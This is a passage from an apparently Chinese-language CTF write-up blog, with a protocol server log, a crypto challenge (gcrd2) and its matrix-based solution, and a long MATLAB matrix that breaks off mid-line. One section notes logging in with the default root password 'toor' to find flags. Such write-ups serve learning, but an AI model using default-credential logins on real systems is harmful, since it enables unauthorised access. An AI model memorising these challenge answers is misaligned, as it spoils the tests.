a <span class="number">128</span>-bit random number in hex.\n&gt; &#x27;</span><br><span class="line"><span class="attribute">b</span>&#x27;[Server]: Your input is rB = <span class="number">114890189739596232616528541525085912499</span>.\n&#x27;</span><br><span class="line"><span class="attribute">b</span>&#x27;[Server]: Encrypt(rA||rB||B, k) (in hex) is ab<span class="number">99</span>f<span class="number">7</span>e<span class="number">937</span>db<span class="number">9988</span>e<span class="number">78194</span>a<span class="number">2</span>dae<span class="number">625</span>de<span class="number">03</span>c<span class="number">13</span>b<span class="number">9</span>d<span class="number">0</span>fc<span class="number">9</span>ba<span class="number">8</span>de<span class="number">822</span>c<span class="number">6</span>b<span class="number">26</span>ee<span class="number">9</span>e<span class="number">9</span>a<span class="number">93</span>f<span class="number">9</span>ee<span class="number">06</span>aa<span class="number">6</span>bdd<span class="number">01025</span>ef<span class="number">1</span>f<span class="number">25</span>d<span class="number">98</span>f<span class="number">9</span>be<span class="number">0</span>\n<span class="meta"></span></span><br><span class="line"><span class="meta">[Server]: Please send Encrypt(rB||rA, k) in hex.\n&gt; &#x27;</span></span><br></pre></td></tr></table></figure><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><h4 id="基础挑战码的可信计算1、2、3"><a href="#基础挑战码的可信计算1、2、3" class="headerlink" title="基础挑战码的可信计算1、2、3"></a>基础挑战码的可信计算1、2、3</h4><p><strong>非预期</strong></p><ul><li>linux关键词查找<code>flag</code></li><li>root密码toor，重复以上</li></ul><p><strong>预期</strong></p><p>太菜了，没预期出来</p><p>赛后没环境、没文件，没法复现</p><h4 id="区块链"><a href="#区块链" class="headerlink" title="区块链"></a>区块链</h4><p>实验室区块链方向的师傅出了，最近打算入个门😈</p><h3 id="初赛总结"><a href="#初赛总结" class="headerlink" title="初赛总结"></a>初赛总结</h3><p>密码出的太❌了，好像啥都有，但正儿八经的、含有数学原理的代码没看到一行👿</p><p>实话实说，给我整emo了😭</p><h2 id="东北赛区复赛"><a href="#东北赛区复赛" class="headerlink" title="东北赛区复赛"></a>东北赛区复赛</h2><h3 id="gcrd2（100）"><a href="#gcrd2（100）" class="headerlink" title="gcrd2（100）"></a>gcrd2（100）</h3><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">import numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="built_in">from</span> flag import T</span><br><span class="line">import <span class="built_in">random</span></span><br><span class="line"></span><br><span class="line">np.set_printoptions(threshold=np.inf)</span><br><span class="line">def <span class="built_in">get</span>():</span><br><span class="line">    <span class="keyword">while</span> True:</span><br><span class="line">        x = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">            <span class="built_in">add</span> = [<span class="built_in">random</span>.randint(<span class="number">0</span>, <span class="number">10</span>)] * i + [<span class="built_in">random</span>.randint(<span class="number">0</span>, <span class="number">10</span>)] * (<span class="number">32</span> - i)</span><br><span class="line">            x.append(<span class="built_in">add</span>)</span><br><span class="line">        <span class="keyword">if</span> np.linalg.matrix_rank(x) == <span class="number">32</span>:</span><br><span class="line">            <span class="literal">return</span> x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">a</span> = np.array(<span class="built_in">get</span>())</span><br><span class="line">b = np.array(<span class="built_in">get</span>())</span><br><span class="line"></span><br><span class="line"><span class="comment"># dot 矩阵乘法</span></span><br><span class="line">aT = np.dot(<span class="keyword">a</span>, T)</span><br><span class="line">bT = np.dot(b, T)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;out&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">        f.<span class="built_in">write</span>(str(str(aT[i, :])[<span class="number">1</span>:<span class="number">-1</span>].<span class="built_in">replace</span>(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)) + <span class="string">&#x27;\n&#x27;</span>)   <span class="comment"># 写入aT</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">        f.<span class="built_in">write</span>(str(str(bT[i, :])[<span class="number">1</span>:<span class="number">-1</span>].<span class="built_in">replace</span>(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)) + <span class="string">&#x27;\n&#x27;</span>)  <span class="comment"># 写入 bT</span></span><br><span class="line">f.<span class="built_in">close</span>()</span><br><span class="line">res = np.dot(bT, np.dot(T, aT))</span><br><span class="line">flag = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> str(res[:, <span class="number">0</span>])[<span class="number">1</span>:<span class="number">-1</span>].<span class="built_in">replace</span>(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>).<span class="built_in">split</span>(<span class="string">&#x27; &#x27;</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> i == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        flag = flag + int(i)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h4 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h4><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">aT</span> = np.dot(a, T)</span><br><span class="line"><span class="attr">bT</span> = np.dot(b, T)</span><br></pre></td></tr></table></figure><p>可知：T为矩阵aT、bT的最大右公因子</p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220618221142293.png" alt="image-20220618221142293"></p><p>由gcrd得：</p><p>将aT、bT堆叠成$\begin{bmatrix} aT \\ bT\end{bmatrix}$,初等行变化 将下端化为0（我理解就是行阶梯形矩阵）</p><p>又仔细看<code>a*T</code> 与 <code>b*T</code>,发现每个数居然也都小于10</p><p>可想而知，T应该是极为稀疏的矩阵，最后用matlab的<code>rref()</code>函数，得到单位矩阵，应证猜想</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">aTbT = [<span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>;</span><br><span class="line"><span class="number">8</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>;</span><br><span class="line"><span class="number">4</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>;</span><br><span class="line"><span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>;</span><br><span class="line"><span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>;</span><br><span class="line"><span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>;</span><br><span class="line"><span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>;</span><br><span class="line"><span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>;</span><br><span class="line"><span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>;</span><br><span class="line"><span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>;</span><br><span class="line"><span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>;</span><br><span class="line"><span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>;</span><br><span class="line"><span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>;</span><br><span class="line"><span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>;</span><br><span class="line"><span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>;</span><br><span class="line"><span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>;</span><br><span class="line"><span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>;</span><br><span class="line"><span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>;</span><br><span class="line"><span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>;</span><br><span class="line"><span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>;</span><br><span class="line"><span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>;</span><br><span class="line"><span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>;</span><br><span class="line"><span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>;</span><br><span class="line"><span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>;</span><br><span class="line"><span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>;</span><br><span class="line"><span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>;</span><br><span class="line"><span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>;</span><br><span class="line"><span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>;</span><br><span class="line"><span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">9</span>;</span><br><span class="line"><span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span 